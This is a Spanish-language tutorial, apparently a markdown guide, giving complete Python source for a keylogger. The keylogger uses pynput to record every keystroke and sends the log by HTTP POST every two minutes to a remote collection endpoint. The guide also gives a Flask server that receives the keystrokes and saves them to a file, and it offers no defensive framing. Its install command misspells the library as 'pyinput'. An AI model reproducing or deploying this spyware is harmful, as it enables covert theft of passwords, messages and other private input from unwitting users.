# KeyLogger en Python

En este documento se describe cómo implementar un keylogger sencillo. El funcionamiento consiste en un programa escrito en Python, el cual registra las teclas que el usuario presiona. El programa envia los resultados a otro PC cada _x_ minutos. 

Dado que este programa utiliza la biblioteca `pynput` para monitorear las teclas y la biblioteca `requests` para realizar solicitudes HTTP al otro PC, es un requisito previo instalar dichos paquetes con `pip`

```
pip install pyinput requests
```

# KeyLogger

```python
import time
from pynput import keyboard
import requests

# Lista para almacenar las teclas presionadas
keys = []

# Función para manejar la pulsación de teclas
def on_press(key):
    try:
        # Obtenemos la tecla presionada en formato de texto
        key_text = key.char
    except AttributeError:
        # Si la tecla no tiene un carácter asociado, la almacenamos como un código especial
        key_text = f'<{key}>'
    
    # Agregamos la tecla a la lista
    keys.append(key_text)

# Función para enviar los datos al otro PC
def send_data():
    # Convierte la lista de teclas en una cadena de texto separada por comas
    keys_text = ','.join(keys)
    
    # Realiza una solicitud POST al otro PC con los datos
    url = 'http://direccion_del_otro_pc/endpoint'  # Reemplaza con la dirección y el punto final correctos
    data = {'keys': keys_text}
    response = requests.post(url, data=data)
    
    # Verifica si la solicitud se realizó correctamente
    if response.status_code == 200:
        print('Datos enviados correctamente')
    else:
        print('Error al enviar los datos')

    # Borra las teclas registradas después de enviar los datos
    keys.clear()

# Configura el monitor de teclado
listener = keyboard.Listener(on_press=on_press)

# Inicia el monitor en segundo plano
listener.start()

while True:
    try:
        # Espera 2 minutos
        time.sleep(120)
        
        # Envía los datos al otro PC
        send_data()
        
    except KeyboardInterrupt:
        # Si se presiona Ctrl+C, detén el programa
        break

```

Asegúrate de reemplazar 'http://direccion_del_otro_pc/endpoint' con la dirección y el punto final correctos del otro PC donde deseas enviar los datos. Asimismo, debes corroborar que el otro PC tiene en marcha el servidor http en funcionamiento que pueda manejar las solicitudes POST.

Finalmente, ten en cuenta que el programa debe ejecutarse con permisos de administrador para poder registrar las teclas presionadas en segundo plano.

# Servidor
Para recibir los datos enviados desde el otro PC, necesitamos implementar un servidor. Este script utiliza el módulo `flask` para crear un servidor web que escucha las solicitudes POST y guarda los datos recibidos en un archivo de texto. Asegurate de instalar la dependencia con 

```
pip install flask
```

El código para el serivor es el siguiente

```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/endpoint', methods=['POST'])
def receive_data():
    keys = request.form.get('keys')
    
    # Guarda los datos recibidos en un archivo de texto
    with open('datos.txt', 'a') as file:
        file.write(keys + '\n')
    
    return 'Datos recibidos correctamente'

if __name__ == '__main__':
    app.run()

```

Al ejecutar este script, se creará un servidor web en el puerto `5000` y escuchará las solicitudes POST en la ruta `/endpoint`. Los datos recibidos se guardarán en un archivo llamado `datos.txt` en el mismo directorio donde se encuentra el script.

Asegúrate de que el otro PC pueda acceder al PC donde se está ejecutando este script. Si están en la misma red, puedes utilizar la dirección IP del PC para hacer la solicitud POST desde el otro PC. Por ejemplo, si el PC que ejecuta el script tiene la dirección IP `192.168.1.100`, puedes enviar la solicitud POST a `http://192.168.1.100:5000/endpoint`.
